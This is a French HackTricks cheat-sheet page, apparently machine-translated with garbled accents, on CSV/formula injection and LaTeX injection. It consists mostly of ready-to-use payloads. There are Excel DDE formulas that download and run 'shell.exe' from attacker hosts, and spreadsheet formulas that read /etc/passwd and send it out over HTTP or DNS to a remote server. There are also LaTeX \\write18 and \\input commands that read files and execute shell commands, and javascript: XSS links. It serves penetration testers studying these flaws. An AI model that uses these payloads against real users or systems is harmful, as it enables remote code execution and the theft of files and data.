# Injection de formules/CSV/Doc/LaTeX/GhostScript

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vuln√©rabilit√©s les plus importantes pour les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des scans de menaces proactifs, trouve des probl√®mes dans toute votre pile technologique, des API aux applications web et syst√®mes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Injection de formules

### Info

Si votre **entr√©e** est **refl√©t√©e** √† l'int√©rieur de **fichiers CSV** (ou tout autre fichier qui sera probablement ouvert par **Excel**), vous pourriez √™tre capable d'ins√©rer des **formules Excel** qui seront **ex√©cut√©es** lorsque l'utilisateur **ouvre le fichier** ou lorsqu'il **clique sur un lien** √† l'int√©rieur de la feuille Excel.

{% hint style="danger" %}
De nos jours, **Excel alertera** (√† plusieurs reprises) l'**utilisateur lorsqu'un √©l√©ment est charg√© depuis l'ext√©rieur d'Excel** afin de le pr√©venir d'une action malveillante. Par cons√©quent, un effort particulier en mati√®re d'ing√©nierie sociale doit √™tre appliqu√© au payload final.
{% endhint %}

### [Liste de mots](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hyperlien

**L'exemple suivant est tr√®s utile pour exfiltrer le contenu de la feuille Excel finale et pour effectuer des requ√™tes vers des emplacements arbitraires. Cependant, il n√©cessite que l'utilisateur clique sur le lien (et accepte les avertissements).**

Exemple pris de [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Supposons un sc√©nario d'attaque du syst√®me de gestion des dossiers √©tudiants d'une √©cole. L'application permet aux enseignants de saisir les d√©tails des √©tudiants de l'√©cole. L'attaquant obtient l'acc√®s √† l'application et souhaite que tous les enseignants utilisant l'application soient compromis. Ainsi, l'attaquant tente de r√©aliser une attaque par injection CSV via l'application web.\
L'attaquant a besoin de voler les d√©tails d'autres √©tudiants. Donc, il utilise la formule Hyperlien et la saisit lors de l'entr√©e des d√©tails des √©tudiants.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_008.png)

Lorsque l'enseignant exporte le CSV et clique sur l'hyperlien, les donn√©es sensibles sont envoy√©es au serveur de l'attaquant.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_009.png)

Le fichier CSV export√© contient une charge utile malveillante.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_010.png)

Les d√©tails de l'√©tudiant sont enregistr√©s sur le serveur web de l'attaquant.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_011.png)

### RCE

Pour que cet exemple fonctionne, il est **n√©cessaire d'activer la configuration suivante** :\
Fichier ‚Üí Options ‚Üí Centre de gestion de la confidentialit√© ‚Üí Param√®tres du Centre de gestion de la confidentialit√© ‚Üí Contenu externe ‚Üí Activer le lancement du serveur d'√©change de donn√©es dynamiques\
ou l'utilisation d'une **version ancienne d'Excel**.

La bonne nouvelle est que **cette charge utile est ex√©cut√©e automatiquement √† l'ouverture du fichier** (si l'utilisateur accepte les avertissements).

Il est possible d'ex√©cuter une calculatrice avec la charge utile suivante **`=cmd|' /C calc'!xxx`**

![](<../.gitbook/assets/image (25) (2) (2) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (8).png>)

### Plus
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LFI

**LibreOffice Calc**

* Cela lira la 1√®re ligne du fichier local /etc/passwd : `='file:///etc/passwd'#$passwd.A1`
* Exfiltrer : `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)))`
* Exfiltrer plus d'une ligne : `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* Exfiltration DNS : `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),"."))`

**Analyse de la charge utile d'exfiltration DNS :**

* ‚Äòfile:///etc/passwd‚Äô#$passwd.A19 ‚Äì Lira la 19√®me ligne du fichier local /etc/passwd
* ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19) ‚Äì Encode l'URL des donn√©es retourn√©es
* MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41) ‚Äì Similaire √† substring, lire les donn√©es du 1er caract√®re au 41√®me ‚Äì une mani√®re tr√®s pratique de limiter la longueur des noms d'h√¥te DNS (limite de 254 caract√®res sur le FQDN et 63 caract√®res pour un label, c'est-√†-dire un sous-domaine)
* SUBSTITUTE(MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41),‚Äù%‚Äù,‚Äù-‚Äú) ‚Äì remplace toutes les instances de % (le caract√®re sp√©cial de l'encodage URL) par un tiret ‚Äì cela garantit que seuls les caract√®res DNS valides sont utilis√©s
* CONCATENATE((SUBSTITUTE(MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41),‚Äù%‚Äù,‚Äù-‚Äú)),‚Äù.\<FQDN>‚Äù) ‚Äì Concat√®ne la sortie du fichier (apr√®s le traitement ci-dessus) avec le FQDN (pour lequel nous avons acc√®s √† l'h√¥te qui est autoritaire pour le domaine)
* WEBSERVICE ‚Äì Fera une demande pour ce nom DNS inexistant que nous pouvons ensuite analyser les logs (ou ex√©cuter tcpdump, etc.) sur le serveur de noms DNS autoritaire pour lequel nous avons le contr√¥le

### Exfiltration de donn√©es OOB Google Sheets

Introduisons d'abord certaines des fonctions les plus int√©ressantes.

**CONCATENATE** : Ajoute des cha√Ænes les unes aux autres.
```
=CONCATENATE(A2:E2)
```
**IMPORTXML** : Importe des donn√©es de divers types de donn√©es structur√©es, y compris XML, HTML, CSV, TSV et des flux XML RSS et ATOM.
```
=IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")
```
**IMPORTFEED** : Importe un flux RSS ou ATOM.
```
=IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))
```
**IMPORTHTML** : Importe des donn√©es √† partir d'une table ou d'une liste dans une page HTML.
```
=IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
```
**IMPORTRANGE** : Importe une plage de cellules √† partir d'une feuille de calcul sp√©cifi√©e.
```
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
```
**IMAGE** : Ins√®re une image dans une cellule.
```
=IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
```
## Injection LaTeX

Habituellement, les serveurs que vous trouverez sur Internet qui **convertissent le code LaTeX en PDF** utilisent **`pdflatex`**.\
Ce programme utilise 3 attributs principaux pour (d√©s)autoriser l'ex√©cution de commandes :

* **`--no-shell-escape`** : **D√©sactive** la construction `\write18{command}`, m√™me si elle est activ√©e dans le fichier texmf.cnf.
* **`--shell-restricted`** : Identique √† `--shell-escape`, mais **limit√©** √† un ensemble 's√ªr' de **commandes pr√©d√©finies** (\*\*Sur Ubuntu 16.04 la liste est dans `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`** : **Active** la construction `\write18{command}`. La commande peut √™tre n'importe quelle commande shell. Cette construction est normalement interdite pour des raisons de s√©curit√©.

Cependant, il existe d'autres moyens d'ex√©cuter des commandes, donc pour √©viter le RCE, il est tr√®s important d'utiliser `--shell-restricted`.

### Lire un fichier <a href="#read-file" id="read-file"></a>

Il se peut que vous deviez ajuster l'injection avec des enveloppes comme \[ ou $.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Lire un fichier √† ligne unique
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Lire un fichier √† lignes multiples
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### √âcrire un fichier <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Ex√©cution de commande <a href="#command-execution" id="command-execution"></a>

L'entr√©e de la commande sera redirig√©e vers stdin, utilisez un fichier temporaire pour la r√©cup√©rer.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Si vous rencontrez une erreur LaTex, envisagez d'utiliser base64 pour obtenir le r√©sultat sans mauvais caract√®res
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

De [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Injection Ghostscript

TODO : Cr√©er un r√©sum√© avec les informations et techniques les plus pertinentes de [https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

## R√©f√©rences

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vuln√©rabilit√©s les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des scans de menaces proactifs, trouve des probl√®mes dans l'ensemble de votre pile technologique, des API aux applications web et syst√®mes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
